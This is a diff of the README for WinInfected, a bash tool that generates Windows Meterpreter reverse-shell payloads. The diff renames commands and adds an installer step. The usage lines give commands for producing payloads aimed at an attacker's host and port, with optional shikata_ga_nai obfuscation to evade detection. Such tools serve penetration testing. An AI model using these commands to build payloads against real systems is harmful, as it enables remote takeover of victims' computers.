@@ -17,13 +17,13 @@ WinInfected is a bash script that automates the generation of a Windows Meterpre
 
 ```bash
 WinInfected v1.2
-Usage: ./WinInfected [LHOST] [LPORT] [--obfuscate]
+Usage: ./wininfected [LHOST] [LPORT] [--obfuscate]
 Options:
   --dependencies   Check and install missing dependencies.
   --update         Update script and dependencies.
   --obfuscate      Enable payload obfuscation using x86/shikata_ga_nai encoder.
   -h, --help       Display this help message.
-  More information: https://github.com/byfranke/WinInfected
+  More information: https://github.com/byfranke/wininfected
 ```
 
 ## Steps to Run:
@@ -36,24 +36,28 @@ git clone https://github.com/byfranke/WinInfected.git
 cd WinInfected
 ```
 ```bash
-chmod +x WinInfected
+chmod +x installer.sh
+```
+
+```bash
+bash installer.sh
 ```
 
 Install Dependencies (if needed):
 ```bash
-./WinInfected --dependencies
+./wininfected --dependencies
 ```
 
 Generate a Payload:
 
 Without Obfuscation:
 ```bash
-./WinInfected <LHOST> <LPORT>
+./wininfected <LHOST> <LPORT>
 ```
 
 With Obfuscation:
 ```bash
-./WinInfected <LHOST> <LPORT> --obfuscate
+./wininfected <LHOST> <LPORT> --obfuscate
 ```
 
 Replace `<LHOST>` with your local host IP and `<LPORT>` with your desired port number.
